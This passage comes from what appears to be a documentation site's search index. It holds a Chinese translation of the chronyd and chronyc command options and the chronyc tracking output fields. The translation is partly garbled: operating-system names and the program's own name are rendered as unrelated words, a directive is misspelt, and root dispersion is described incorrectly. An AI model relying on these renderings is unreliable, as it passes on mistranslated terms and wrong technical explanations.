\u662f\u5728\u542f\u7528\u8c03\u8bd5\u652f\u6301\u7684\u60c5\u51b5\u4e0b\u7f16\u8bd1\u7684\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u6b64\u9009\u9879\u4e24\u6b21\u6765\u542f\u7528\u8c03\u8bd5\u6d88\u606f\u3002 -l \u6587\u4ef6 \u6b64\u9009\u9879\u5141\u8bb8\u5c06\u65e5\u5fd7\u6d88\u606f\u5199\u5165\u6587\u4ef6\uff0c\u800c\u4e0d\u662f syslog \u6216\u7ec8\u7aef\u3002 -L \u7ea7 \u6b64\u9009\u9879\u6307\u5b9a\u8981\u5199\u5165\u65e5\u5fd7\u6587\u4ef6\u3001syslog \u6216\u7ec8\u7aef\u7684\u6d88\u606f\u7684\u6700\u4f4e\u4e25\u91cd\u6027\u7ea7\u522b\u3002\u53ef\u4ee5\u6307\u5b9a\u4ee5\u4e0b\u7ea7\u522b\uff1a0\uff08\u4fe1\u606f\u6027\uff09\u30011\uff08\u8b66\u544a\uff09\u30012\uff08\u975e\u81f4\u547d\u9519\u8bef\uff09\u548c 3\uff08\u81f4\u547d\u9519\u8bef\uff09\u3002\u9ed8\u8ba4\u503c\u4e3a 0\u3002 -p \u5728\u6b64\u6a21\u5f0f\u4e0b\u8fd0\u884c\u65f6\uff0cchronyd \u5c06\u6253\u5370\u914d\u7f6e\u5e76\u9000\u51fa\u3002\u5b83\u4e0d\u4f1a\u4e0e\u7ec8\u7aef\u5206\u79bb\u3002\u6b64\u9009\u9879\u53ef\u7528\u4e8e\u9a8c\u8bc1\u914d\u7f6e\u7684\u8bed\u6cd5\u5e76\u83b7\u53d6\u6574\u4e2a\u914d\u7f6e\uff0c\u5373\u4f7f\u5b83\u88ab\u62c6\u5206\u4e3a\u591a\u4e2a\u6587\u4ef6\u5e76\u7531 include \u6216 confdir \u6307\u4ee4\u8bfb\u53d6\u3002 -q \u5728\u6b64\u6a21\u5f0f\u4e0b\u8fd0\u884c\u65f6\uff0cchronyd \u5c06\u8bbe\u7f6e\u7cfb\u7edf\u65f6\u949f\u4e00\u6b21\u5e76\u9000\u51fa\u3002\u5b83\u4e0d\u4f1a\u4e0e\u7ec8\u7aef\u5206\u79bb\u3002 -Q \u6b64\u9009\u9879\u4e0e -q \u9009\u9879\u7c7b\u4f3c\uff0c\u53ea\u662f\u5b83\u53ea\u6253\u5370\u504f\u79fb\u91cf\u800c\u4e0d\u5bf9\u65f6\u949f\u8fdb\u884c\u4efb\u4f55\u6821\u6b63\uff0c\u5e76\u4e14\u5b83\u5141\u8bb8\u5728\u6ca1\u6709 root \u6743\u9650\u7684\u60c5\u51b5\u4e0b\u542f\u52a8 chronyd\u3002 -r \u6b64\u9009\u9879\u5c06\u5c1d\u8bd5\u91cd\u65b0\u52a0\u8f7d\u5e76\u5220\u9664\u5305\u542b\u6bcf\u4e2a\u670d\u52a1\u5668\u7684\u793a\u4f8b\u5386\u53f2\u8bb0\u5f55\u548c\u6b63\u5728\u4f7f\u7528\u7684\u53c2\u8003\u65f6\u949f\u7684\u6587\u4ef6\u3002\u8fd9\u4e9b\u6587\u4ef6\u5e94\u4f4d\u4e8e\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684 dumpdir \u6307\u4ee4\u6307\u5b9a\u7684\u76ee\u5f55\u4e2d\u3002\u5982\u679c\u60a8\u51fa\u4e8e\u4efb\u4f55\u539f\u56e0\uff08\u4f8b\u5982\u5b89\u88c5\u65b0\u7248\u672c\uff09\u60f3\u8981\u77ed\u6682\u505c\u6b62\u5e76\u91cd\u65b0\u542f\u52a8chronyd\uff0c\u5219\u6b64\u9009\u9879\u5f88\u6709\u7528\u3002\u4f46\u662f\uff0c\u5b83\u5e94\u8be5\u53ea\u7528\u4e8e\u5185\u6838\u53ef\u4ee5\u5728\u4e0d\u53d7\u65f6\u95f4\u63a7\u5236\u7684\u60c5\u51b5\u4e0b\u4fdd\u6301\u65f6\u949f\u8865\u507f\u7684\u7cfb\u7edf\uff08\u5373 Linux\u3001FreeBSD\u3001NetBSD\u3001\u5149\u6e90\u548c macOS 10.13 \u6216\u66f4\u9ad8\u7248\u672c\uff09\u3002 -R \u4f7f\u7528\u6b64\u9009\u9879\u65f6\uff0c\u5c06\u5ffd\u7565\u521d\u59cb\u5316\u540c\u6b65\u6307\u4ee4\u548c\u5177\u6709\u6b63\u9650\u5236\u7684 maketep \u6307\u4ee4\u3002\u6b64\u9009\u9879\u5728\u91cd\u65b0\u542f\u52a8 chronyd \u65f6\u5f88\u6709\u7528\uff0c\u53ef\u4ee5\u4e0e -r \u9009\u9879\u7ed3\u5408\u4f7f\u7528\u3002 -s \u6b64\u9009\u9879\u5c06\u8bbe\u7f6e\u7cfb\u7edf\u65f6\u949f\u4ece\u8ba1\u7b97\u673a\u7684\u5b9e\u65f6\u65f6\u949f \uff08RTC\uff09 \u6216\u5230 driftfile \u6307\u4ee4\u6307\u5b9a\u7684\u6587\u4ef6\u7684\u4e0a\u6b21\u4fee\u6539\u65f6\u95f4\u3002\u5b9e\u65f6\u65f6\u949f\u4ec5\u5728 Linux \u4e0a\u53d7\u652f\u6301\u3002 \u5982\u679c\u4e0e -r \u6807\u5fd7\u7ed3\u5408\u4f7f\u7528\uff0cchronyd \u5c06\u5728\u4ece RTC \u8bbe\u7f6e\u7cfb\u7edf\u65f6\u949f\u540e\u5c1d\u8bd5\u4fdd\u7559\u65e7\u6837\u672c\u3002\u8fd9\u53ef\u7528\u4e8e\u5141\u8bb8 chronyd \u5728\u7cfb\u7edf\u91cd\u65b0\u542f\u52a8\u671f\u95f4\u6267\u884c\u589e\u76ca\u6216\u635f\u5931\u7387\u7684\u957f\u671f\u5e73\u5747\uff0c\u5e76\u4e14\u5bf9\u4e8e\u95f4\u6b47\u6027\u8bbf\u95ee\u5728\u4e0d\u4f7f\u7528\u65f6\u5173\u95ed\u7684\u7f51\u7edc\u7684\u7cfb\u7edf\u975e\u5e38\u6709\u7528\u3002\u4e3a\u4e86\u4f7f\u5176\u6b63\u5e38\u5de5\u4f5c\uff0c\u5b83\u4f9d\u8d56\u4e8echronyd\u80fd\u591f\u786e\u5b9a\u4e0a\u6b21\u8ba1\u7b97\u673a\u6253\u5f00\u65f6RTC\u548c\u7cfb\u7edf\u65f6\u949f\u4e4b\u95f4\u5dee\u5f02\u7684\u51c6\u786e\u7edf\u8ba1\u4fe1\u606f\u3002 \u5982\u679c\u6f02\u79fb\u6587\u4ef6\u7684\u4e0a\u6b21\u4fee\u6539\u65f6\u95f4\u540c\u65f6\u665a\u4e8e\u5f53\u524d\u65f6\u95f4\u548c RTC \u65f6\u95f4\uff0c\u5219\u7cfb\u7edf\u65f6\u95f4\u5c06\u8bbe\u7f6e\u4e3a\u8be5\u65f6\u95f4\uff0c\u4ee5\u6062\u590d\u4e4b\u524d\u505c\u6b62 chronyd \u7684\u65f6\u95f4\u3002\u8fd9\u5728\u6ca1\u6709RTC\u6216RTC\u635f\u574f\uff08\u4f8b\u5982\uff0c\u5b83\u6ca1\u6709\u7535\u6c60\uff09\u7684\u8ba1\u7b97\u673a\u4e0a\u5f88\u6709\u7528\u3002 -t timeout \u6b64\u9009\u9879\u8bbe\u7f6e\u8d85\u65f6\uff08\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff09\uff0c\u4e4b\u540e chronyd \u5c06\u9000\u51fa\u3002\u5982\u679c\u65f6\u949f\u672a\u540c\u6b65\uff0c\u5b83\u5c06\u4ee5\u975e\u96f6\u72b6\u6001\u9000\u51fa\u3002\u8fd9\u5bf9\u4e8e -q \u6216 -Q \u9009\u9879\uff08\u7528\u4e8e\u7f29\u77ed\u7b49\u5f85\u6d4b\u91cf\u7684\u6700\u957f\u65f6\u95f4\uff09\u6216 -r \u9009\u9879\uff08\u7528\u4e8e\u9650\u5236 chronyd \u8fd0\u884c\u65f6\u95f4\uff0c\u4f46\u4ecd\u5141\u8bb8\u5b83\u8c03\u6574\u7cfb\u7edf\u65f6\u949f\u7684\u9891\u7387\uff09\u975e\u5e38\u6709\u7528\u3002 -u user \u6b64\u9009\u9879\u8bbe\u7f6e chronyd \u5728\u542f\u52a8\u540e\u5c06\u5207\u6362\u5230\u7684\u7cfb\u7edf\u7528\u6237\u7684\u540d\u79f0\uff0c\u4ee5\u4fbf\u5220\u9664 root \u6743\u9650\u3002\u5b83\u8986\u76d6\u7528\u6237\u6307\u4ee4\u3002\u7f16\u8bd1\u7684\u9ed8\u8ba4\u503c\u4e3a root\u3002 \u5728 Linux \u4e0a\uff0c\u9700\u8981\u7f16\u8bd1\u65f6\u652f\u6301\u5e93\u5e93\u3002\u5728 macOS \u4e0a\uff0c\u81ea\u7531\u8f6f\u4ef6\u3001\u7f51\u7edc\u64cd\u4f5c\u7cfb\u7edf\u548c\u5149\u6e90\u5c06\u65f6\u95f4\u5206\u53c9\u6210\u4e24\u4e2a\u8fdb\u7a0b\u3002\u5b50\u8fdb\u7a0b\u4fdd\u7559 root \u6743\u9650\uff0c\u4f46\u53ea\u80fd\u4ee3\u8868\u7236\u8fdb\u7a0b\u6267\u884c\u975e\u5e38\u6709\u9650\u7684\u7279\u6743\u7cfb\u7edf\u8c03\u7528\u3002 -U \u6b64\u9009\u9879\u7981\u7528\u5bf9 root \u6743\u9650\u7684\u68c0\u67e5\uff0c\u4ee5\u5141\u8bb8\u5728\u975e root \u7528\u6237\u4e0b\u542f\u52a8 chronyd\uff0c\u5047\u8bbe\u8be5\u8fdb\u7a0b\u5c06\u5177\u6709\u5728\u6307\u5b9a\u914d\u7f6e\u4e2d\u6b63\u786e\u64cd\u4f5c\u6240\u9700\u7684\u6240\u6709\u529f\u80fd\uff08\u4f8b\u5982\uff0c\u7531\u670d\u52a1\u7ba1\u7406\u5668\u63d0\u4f9b\uff09\u548c\u5bf9\u6240\u6709\u6587\u4ef6\u3001\u76ee\u5f55\u548c\u8bbe\u5907\u7684\u8bbf\u95ee\u6743\u9650\u3002\u8bf7\u6ce8\u610f\uff0c\u4e0d\u540c\u7684\u914d\u7f6e\u548c\u4e0d\u540c\u7684 Linux \u5185\u6838\u7248\u672c\u53ef\u80fd\u9700\u8981\u4e0d\u540c\u7684\u529f\u80fd\u3002\u5f53\u914d\u7f6e\u672a\u77e5\u65f6\uff0c\u4e0d\u5efa\u8bae\u5728\u975e root \u7528\u6237\u4e0b\u542f\u52a8 chronyd\uff0c\u6216\u8005\u81f3\u5c11\u4ec5\u9650\u4e8e\u7279\u5b9a\u6307\u4ee4\u3002 -F level \u6b64\u9009\u9879\u914d\u7f6e\u7531 chronyd \u8fdb\u7a0b\u52a0\u8f7d\u7684\u7cfb\u7edf\u8c03\u7528\u7b5b\u9009\u5668\uff08\u5982\u679c\u7f16\u8bd1\u65f6\u652f\u6301 Linux \u5b89\u5168\u8ba1\u7b97 \uff08seccomp\uff09 \u5de5\u5177\uff09\u3002\u5b9a\u4e49\u4e86\u4e09\u4e2a\u7ea7\u522b\uff1a0\u30011\u30012.\u7b5b\u9009\u5668\u5728\u7ea7\u522b 0 \u5904\u7981\u7528\u3002\u5728\u7ea7\u522b 1 \u548c 2 \u4e2d\uff0c\u5982\u679c chronyd \u53d1\u51fa\u88ab\u8fc7\u6ee4\u5668\u963b\u6b62\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u5219 chronyd \u5c06\u88ab\u6740\u6b7b\u3002\u53ef\u4ee5\u5c06\u7535\u5e73\u6307\u5b9a\u4e3a\u8d1f\u6570\u4ee5\u89e6\u53d1 SIGSYS \u4fe1\u53f7\uff0c\u800c\u4e0d\u662f SIGKILL\uff0c\u8fd9\u5bf9\u4e8e\u8c03\u8bd5\u975e\u5e38\u6709\u7528\u3002\u9ed8\u8ba4\u503c\u4e3a 0\u3002 \u5728\u7ea7\u522b 1 \u4e2d\uff0c\u7b5b\u9009\u5668\u4ec5\u5141\u8bb8\u901a\u5e38\u7531 chronyd \u8fdb\u884c\u7684\u9009\u5b9a\u7cfb\u7edf\u8c03\u7528\u3002\u5176\u4ed6\u7cfb\u7edf\u8c03\u7528\u88ab\u963b\u6b62\u3002\u4ec5\u5f53\u5df2\u77e5\u6b64\u7ea7\u522b\u5728\u5b89\u88c5\u4e86 chrony \u7684\u7cfb\u7edf\u7248\u672c\u4e0a\u6709\u6548\u65f6\uff0c\u624d\u5efa\u8bae\u4f7f\u7528\u6b64\u7ea7\u522b\u3002\u8fc7\u6ee4\u5668\u8fd8\u9700\u8981\u5141\u8bb8 chronyd \u6b63\u5728\u4f7f\u7528\u7684\u5e93\uff08\u4f8b\u5982 libc\uff09\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528\uff0c\u4f46\u5e93\u7684\u4e0d\u540c\u7248\u672c\u6216\u5b9e\u73b0\u53ef\u80fd\u4f1a\u8fdb\u884c\u4e0d\u540c\u7684\u7cfb\u7edf\u8c03\u7528\u3002\u5982\u679c\u7b5b\u9009\u5668\u7f3a\u5c11\u7cfb\u7edf\u8c03\u7528\uff0c\u5219\u5373\u4f7f\u5728\u6b63\u5e38\u64cd\u4f5c\u4e2d\u4e5f\u53ef\u80fd\u88ab\u7ec8\u6b62 chronyd\u3002 \u5728\u7ea7\u522b 2 \u4e2d\uff0c\u7b5b\u9009\u5668\u4ec5\u963b\u6b62\u5c11\u91cf\u7279\u5b9a\u7cfb\u7edf\u8c03\u7528\uff08\u4f8b\u5982\u5206\u53c9\u548c exec\uff09\u3002\u8fd9\u79cd\u65b9\u6cd5\u5e94\u8be5\u907f\u514d\u8bef\u62a5\uff0c\u4f46\u5bf9\u7cfb\u7edf\u514d\u53d7\u53d7\u635f\u7684 chronyd \u8fdb\u7a0b\u7684\u4fdd\u62a4\u8981\u6709\u9650\u5f97\u591a\u3002 \u4e0d\u80fd\u4f7f\u7528\u90ae\u4ef6\u66f4\u6539\u6307\u4ee4\u542f\u7528\u7b5b\u9009\u5668\u3002 -P \u4f18\u5148\u7ea7 \u5728 Linux\u3001FreeBSD\u3001NetBSD \u548c\u5149\u6e90\u4e0a\uff0c\u6b64\u9009\u9879\u5c06\u4ee5\u6307\u5b9a\u7684\u4f18\u5148\u7ea7\uff08\u5fc5\u987b\u5728 0 \u5230 100 \u4e4b\u95f4\uff09\u9009\u62e9SCHED_FIFO\u5b9e\u65f6\u8c03\u5ea6\u7a0b\u5e8f\u3002\u5728 macOS \u4e0a\uff0c\u6b64\u9009\u9879\u7684\u503c\u5fc5\u987b\u4e3a 0 \u624d\u80fd\u7981\u7528\u7ebf\u7a0b\u65f6\u95f4\u9650\u5236\u7b56\u7565\uff0c\u6216\u8005\u5176\u503c\u4e3a 1 \u624d\u80fd\u542f\u7528\u7b56\u7565\u3002\u5176\u4ed6\u7cfb\u7edf\u4e0d\u652f\u6301\u6b64\u9009\u9879\u3002\u9ed8\u8ba4\u503c\u4e3a 0\u3002 -m \u6b64\u9009\u9879\u5c06\u6309\u65f6\u95f4\u987a\u5e8f\u9501\u5b9a\u5230RAM\u4e2d\uff0c\u4ee5\u4fbf\u6c38\u8fdc\u4e0d\u4f1a\u5206\u9875\u3002\u6b64\u6a21\u5f0f\u4ec5\u5728 Linux\u3001\u81ea\u7531\u8f6f\u4ef6\u3001\u7f51\u7edc\u64cd\u4f5c\u7cfb\u7edf\u548c\u5149\u6e90\u4e0a\u53d7\u652f\u6301\u3002 -x \u6b64\u9009\u9879\u7981\u7528\u5bf9\u7cfb\u7edf\u65f6\u949f\u7684\u63a7\u5236\u3002\u4e0d\u4f1a\u5c1d\u8bd5\u5bf9\u65f6\u949f\u8fdb\u884c\u4efb\u4f55\u8c03\u6574\u3002\u5b83\u5c06\u5047\u8bbe\u65f6\u949f\u662f\u81ea\u7531\u8fd0\u884c\u7684\uff0c\u5e76\u4e14\u4ecd\u7136\u8ddf\u8e2a\u5176\u76f8\u5bf9\u4e8e\u4f30\u8ba1\u771f\u5b9e\u65f6\u95f4\u7684\u504f\u79fb\u91cf\u548c\u9891\u7387\u3002\u6b64\u9009\u9879\u5141\u8bb8\u5728\u6ca1\u6709\u8c03\u6574\u6216\u8bbe\u7f6e\u7cfb\u7edf\u65f6\u949f\uff08\u4f8b\u5982\u5728\u67d0\u4e9b\u5bb9\u5668\u4e2d\uff09\u4ee5\u4f5c\u4e3aNTP\u670d\u52a1\u5668\u8fd0\u884c\u7684\u60c5\u51b5\u4e0b\u542f\u52a8chronyd\u3002 -v\uff0c --\u7248\u672c \u4f7f\u7528\u6b64\u9009\u9879\uff0cchronyd\u5c06\u6253\u5370\u7248\u672c\u53f7\u5230\u7ec8\u7aef\u5e76\u9000\u51fa\u3002 -h\uff0c --\u5e2e\u52a9 \u4f7f\u7528\u6b64\u9009\u9879\uff0cchronyd\u5c06\u5411\u7ec8\u7aef\u6253\u5370\u5e2e\u52a9\u6d88\u606f\u5e76\u9000\u51fa\u3002 \u8be6\u7ec6\u4fe1\u606f\u67e5\u8be2\uff1ahttps://chrony.tuxfamily.org/doc/4.3/chronyd.html","title":"chronyd\u547d\u4ee4"},{"location":"system/centos7/chronyd/#chronyc","text":"\u8bed\u6cd5 chronyc [\u9009\u9879]...[\u6307\u4ee4]... \u529f\u80fd chronyc\u662f\u4e00\u4e2a\u547d\u4ee4\u884c\u754c\u9762\u7a0b\u5e8f\uff0c\u53ef\u7528\u4e8e\u76d1\u89c6chronyd\u7684\u6027\u80fd\uff0c\u5e76\u5728\u8fd0\u884c\u65f6\u66f4\u6539\u5404\u79cd\u64cd\u4f5c\u53c2\u6570\u3002\u5982\u679c\u672a\u5728\u547d\u4ee4\u884c\u4e0a\u6307\u5b9a\u4efb\u4f55\u547d\u4ee4\uff0cchronyc\u5c06\u671f\u671b\u6765\u81ea\u7528\u6237\u7684\u8f93\u5165\u3002\u4ece\u7ec8\u7aef\u8fd0\u884c\u65f6\u5c06\u663e\u793a chronyc> \u3002\u5982\u679c chronyc \u7684\u8f93\u5165\u6216\u8f93\u51fa\u4ece\u6587\u4ef6\u91cd\u5b9a\u5411\u5230\u6587\u4ef6\u6216\u91cd\u5b9a\u5411\u5230\u6587\u4ef6\uff0c\u5219\u4e0d\u4f1a\u663e\u793a\u63d0\u793a\u3002 \u9009\u9879 -4 \u4f7f\u7528\u6b64\u9009\u9879\uff0c\u4e3b\u673a\u540d\u5c06\u4ec5\u89e3\u6790\u4e3a IPv4 \u5730\u5740\u3002 -6 \u4f7f\u7528\u6b64\u9009\u9879\uff0c\u4e3b\u673a\u540d\u5c06\u4ec5\u89e3\u6790\u4e3a IPv6 \u5730\u5740\u3002 -n \u6b64\u9009\u9879\u7981\u7528\u5c06 IP \u5730\u5740\u89e3\u6790\u4e3a\u4e3b\u673a\u540d\uff0c\u4f8b\u5982\uff0c\u4ee5\u907f\u514d\u7f13\u6162\u7684 DNS \u67e5\u627e\u3002\u957f\u5730\u5740\u4e0d\u4f1a\u88ab\u622a\u65ad\u4ee5\u9002\u5408\u8be5\u5217\u3002 -N \u6b64\u9009\u9879\u5141\u8bb8\u6253\u5370\u914d\u7f6e\u6587\u4ef6\u6216 chronyc \u547d\u4ee4\u4e2d\u6307\u5b9a\u7684 NTP \u6e90\u7684\u539f\u59cb\u4e3b\u673a\u540d\u6216 IP \u5730\u5740\u3002\u5982\u679c\u6ca1\u6709 -n \u548c -N \u9009\u9879\uff0c\u5219\u6253\u5370\u7684\u4e3b\u673a\u540d\u662f\u4ece\u53cd\u5411 DNS \u67e5\u627e\u4e2d\u83b7\u53d6\u7684\uff0c\u5e76\u4e14\u53ef\u4ee5\u4e0e\u6307\u5b9a\u7684\u4e3b\u673a\u540d\u4e0d\u540c\u3002 -c \u6b64\u9009\u9879\u5141\u8bb8\u4ee5\u9017\u53f7\u5206\u9694\u503c \uff08CSV\uff09 \u683c\u5f0f\u6253\u5370\u62a5\u8868\u3002\u53cd\u5411 DNS \u67e5\u627e\u5c06\u88ab\u7981\u7528\uff0c\u65f6\u95f4\u5c06\u6253\u5370\u4e3a\u81ea epoch \u4ee5\u6765\u7684\u79d2\u6570\uff0c\u5e76\u4e14\u4ee5\u79d2\u4e3a\u5355\u4f4d\u7684\u503c\u5c06\u4e0d\u4f1a\u8f6c\u6362\u4e3a\u5176\u4ed6\u5355\u4f4d\u3002\u4f8b\u5982 chronyc -c tracking \u4f1a\u628a\u7ed3\u679c\u6253\u5370\u6210CSV\u683c\u5f0f -d \u5982\u679c chronyc \u662f\u5728\u8c03\u8bd5\u652f\u6301\u4e0b\u7f16\u8bd1\u7684\uff0c\u5219\u6b64\u9009\u9879\u5141\u8bb8\u6253\u5370\u8c03\u8bd5\u6d88\u606f\u3002 -m \u901a\u5e38\uff0c\u547d\u4ee4\u884c\u4e0a\u7684\u6240\u6709\u53c2\u6570\u90fd\u88ab\u89e3\u91ca\u4e3a\u4e00\u4e2a\u547d\u4ee4\u3002\u4f7f\u7528\u6b64\u9009\u9879\u53ef\u4ee5\u6307\u5b9a\u591a\u4e2a\u547d\u4ee4\u3002\u6bcf\u4e2a\u53c2\u6570\u5c06\u88ab\u89e3\u91ca\u4e3a\u4e00\u4e2a\u5b8c\u6574\u7684\u547d\u4ee4\u3002 -h \u4e3b\u673a \u6b64\u9009\u9879\u6307\u5b9a\u8981\u6309\u65f6\u95f4\u987a\u5e8f\u8054\u7cfb\u7684\u4e3b\u673a\u3002\u53ef\u4ee5\u4f7f\u7528\u4e3b\u673a\u540d\u3001IP \u5730\u5740\u6216\u672c\u5730 Unix \u57df\u5957\u63a5\u5b57\u7684\u8def\u5f84\u6765\u6307\u5b9a\u5b83\u3002\u53ef\u4ee5\u5c06\u591a\u4e2a\u503c\u6307\u5b9a\u4e3a\u9017\u53f7\u5206\u9694\u7684\u5217\u8868\u4ee5\u63d0\u4f9b\u56de\u9000\u3002 \u9ed8\u8ba4\u503c\u4e3a /var/run/chrony/chronyd.sock,127.0.0.1,::1 \uff0c\u5373\u8fd0\u884c\u65f6\u95f4\u8f74\u7684\u4e3b\u673a\u3002\u9996\u5148\uff0c\u5b83\u5c1d\u8bd5\u8fde\u63a5\u5230Unix\u57df\u5957\u63a5\u5b57\uff0c\u5982\u679c\u5931\u8d25\uff08\u4f8b\u5982\uff0c\u7531\u4e8e\u5728\u975eroot\u7528\u6237\u4e0b\u8fd0\u884c\uff09\uff0c\u5b83\u5c06\u5c1d\u8bd5\u8fde\u63a5\u5230127.0.0.1\uff0c\u7136\u540e\u662f::1\u3002 -p \u7aef\u53e3 \u6b64\u9009\u9879\u5141\u8bb8\u7528\u6237\u6307\u5b9a\u76ee\u6807\u65f6\u95f4\u8f74\u7528\u4e8e\u5176\u76d1\u89c6\u8fde\u63a5\u7684 UDP \u7aef\u53e3\u53f7\u3002\u8fd9\u9ed8\u8ba4\u4e3a323\uff1b\u5f88\u5c11\u9700\u8981\u6539\u53d8\u8fd9\u4e00\u70b9\u3002 -f \u6587\u4ef6 \u6b64\u9009\u9879\u5c06\u88ab\u5ffd\u7565\uff0c\u4ec5\u4e3a\u517c\u5bb9\u6027\u800c\u63d0\u4f9b\u3002 -a \u6b64\u9009\u9879\u5c06\u88ab\u5ffd\u7565\uff0c\u4ec5\u4e3a\u517c\u5bb9\u6027\u800c\u63d0\u4f9b\u3002 -v\uff0c --\u7248\u672c \u4f7f\u7528\u6b64\u9009\u9879\uff0cchronyc\u5728\u7ec8\u7aef\u4e0a\u663e\u793a\u5176\u7248\u672c\u53f7\u5e76\u9000\u51fa\u3002 --\u5e2e\u52a9 \u4f7f\u7528\u6b64\u9009\u9879\uff0cchronyc \u4f1a\u5728\u7ec8\u7aef\u4e0a\u663e\u793a\u4e00\u6761\u5e2e\u52a9\u6d88\u606f\u5e76\u9000\u51fa\u3002 \u66f4\u591a\u7ec6\u8282\u67e5\u770b\uff1ahttps://chrony.tuxfamily.org/doc/4.3/chronyd.html","title":"chronyc\u547d\u4ee4"},{"location":"system/centos7/chronyd/#chronyc_1","text":"","title":"chronyc\u652f\u6301\u7684\u6307\u4ee4"},{"location":"system/centos7/chronyd/#tracking","text":"# chronyc tracking Reference ID : CB00710F (foo.example.net) Stratum : 3 Ref time (UTC) : Fri Jan 27 09:49:17 2017 System time : 0.000006523 seconds slow of NTP time Last offset : -0.000006747 seconds RMS offset : 0.000035822 seconds Frequency : 3.225 ppm slow Residual freq : -0.000 ppm Skew : 0.129 ppm Root delay : 0.013639022 seconds Root dispersion : 0.001100737 seconds Update interval : 64.2 seconds Leap status : Normal","title":"tracking"},{"location":"system/centos7/chronyd/#tracking_1","text":"Reference ID \u8fd9\u662f\u8ba1\u7b97\u673a\u5f53\u524d\u540c\u6b65\u5230\u7684\u670d\u52a1\u5668\u7684\u5f15\u7528 ID \u6216\u8005\u540d\u79f0\uff08\u6216 IP \u5730\u5740\uff0c\u57df\u540d\uff09\uff0c\u5982\u679c\u5f15\u7528 ID \u4e3a 7F7F0101 \u5e76\u4e14\u6ca1\u6709\u540d\u79f0\u6216 IP \u5730\u5740\uff0c\u5219\u8868\u793a\u8ba1\u7b97\u673a\u672a\u540c\u6b65\u5230\u4efb\u4f55\u5916\u90e8\u6e90 Stratum \u8be5\u5c42\u8868\u793a\u6211\u4eec\u8ddd\u79bb\u8fde\u63a5\u4e86\u53c2\u8003\u65f6\u949f\u7684\u8ba1\u7b97\u673a\u6709\u591a\u5c11\u8dc3\u70b9\uff0c\u672c\u673a\u7b97\u4e00\u4e2a\u70b9\u3002 Ref time \u8fd9\u662f\u5904\u7406\u6765\u81ea\u53c2\u8003\u6e90\u7684\u6700\u540e\u4e00\u6b21\u6d4b\u91cf\u7684\u65f6\u95f4 \uff08UTC\uff09\u3002 System time \u8fd9\u662f NTP \u65f6\u949f\u548c\u7cfb\u7edf\u65f6\u949f\u4e4b\u95f4\u7684\u504f\u79fb\u3002NTP \u670d\u52a1\u5668\u4e3a NTP \u5ba2\u6237\u7aef\u63d0\u4f9b\u65f6\u95f4\u3002\u7cfb\u7edf\u65f6\u949f\u4e0e NTP \u65f6\u949f\u540c\u6b65\u3002\u4e3a\u4e86\u907f\u514d\u7cfb\u7edf\u65f6\u95f4\u4e2d\u7684\u6b65\u9aa4\uff08\u8fd9\u53ef\u80fd\u4f1a\u5bf9\u67d0\u4e9b\u5e94\u7528\u7a0b\u5e8f\u4ea7\u751f\u8d1f\u9762\u5f71\u54cd\uff09\uff0c\u901a\u5e38\u53ea\u80fd\u901a\u8fc7\u52a0\u901f\u6216\u51cf\u6162\u6765\u6821\u6b63\u7cfb\u7edf\u65f6\u949f\u3002\u5982\u679c\u504f\u79fb\u91cf\u592a\u5927\uff0c\u6b64\u6821\u6b63\u5c06\u82b1\u8d39\u5f88\u957f\u65f6\u95f4\u3002\u53ef\u4ee5\u901a\u8fc7 maketep \u547d\u4ee4\u6216\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684 maketep \u6307\u4ee4\u5f3a\u5236\u6267\u884c\u6b65\u9aa4\u3002 \u8bf7\u6ce8\u610f\uff0c chronyc \u62a5\u544a\u7684\u6240\u6709\u5176\u4ed6\u504f\u79fb\u91cf\u548c\u65e5\u5fd7\u6587\u4ef6\u4e2d\u7684\u5927\u591a\u6570\u504f\u79fb\u91cf\u90fd\u662f\u76f8\u5bf9\u4e8e NTP \u65f6\u949f\u7684\uff0c\u800c\u4e0d\u662f\u76f8\u5bf9\u4e8e\u7cfb\u7edf\u65f6\u949f\u7684\u3002 Last offset \u8fd9\u662f\u4e0a\u6b21\u65f6\u949f\u66f4\u65b0\u65f6\u4f30\u8ba1\u7684\u672c\u5730\u504f\u79fb\u91cf\u3002\u6b63\u503c\u8868\u793a\u672c\u5730\u65f6\u95f4\uff08\u5982\u524d\u6240\u8ff0\u4f30\u8ba1\u7684\u771f\u5b9e\u65f6\u95f4\uff09\u65e9\u4e8e\u65f6\u95f4\u6e90\u3002 RMS offset \u8fd9\u662f\u504f\u79fb\u503c\u7684\u957f\u671f\u5e73\u5747\u503c\u3002 Frequency \u201c\u9891\u7387\u201d\u662f\u7cfb\u7edf\u65f6\u949f\u51fa\u9519\u7684\u901f\u7387\uff0c\u5982\u679c chronyd \u6ca1\u6709\u7ea0\u6b63\u5b83\u3002\u5b83\u4ee5 ppm\uff08\u767e\u4e07\u5206\u4e4b\u51e0\uff09\u8868\u793a\u3002\u4f8b\u5982\uff0c1 ppm \u7684\u503c\u610f\u5473\u7740\u5f53\u7cfb\u7edf\u65f6\u949f\u8ba4\u4e3a\u5b83\u5df2\u7ecf\u524d\u8fdb\u4e86 1 \u79d2\u65f6\uff0c\u5b83\u5b9e\u9645\u4e0a\u76f8\u5bf9\u4e8e\u771f\u5b9e\u65f6\u95f4\u524d\u8fdb\u4e86 1.000001 \u79d2\u3002 Residual freq \u8fd9\u663e\u793a\u4e86\u5f53\u524d\u6240\u9009\u53c2\u8003\u6e90\u7684\u201c\u6b8b\u4f59\u9891\u7387\u201d\u3002\u8fd9\u53cd\u6620\u4e86\u53c2\u8003\u6e90\u7684\u6d4b\u91cf\u503c\u6307\u793a\u7684\u9891\u7387\u4e0e\u5f53\u524d\u4f7f\u7528\u7684\u9891\u7387\u4e4b\u95f4\u7684\u4efb\u4f55\u5dee\u5f02\u3002 Skew \u8fd9\u662f\u9891\u7387\u4e0a\u7ed1\u5b9a\u7684\u4f30\u8ba1\u8bef\u5dee\u3002 Root delay \u8fd9\u662f\u4ece\u4e0a\u4e00\u8df3\u5230\u6b64\u8ba1\u7b97\u673a\u7684\u7f51\u7edc\u8def\u5f84\u5ef6\u8fdf Root dispersion \u8fd9\u662f\u7f51\u7edc\u8def\u5f84\u5ef6\u8fdf\u7684\u603b\u548c\u3002 Update interval \u8fd9\u662f\u6700\u8fd1\u4e24\u6b21\u65f6\u949f\u66f4\u65b0\u4e4b\u95f4\u7684\u95f4\u9694\u3002 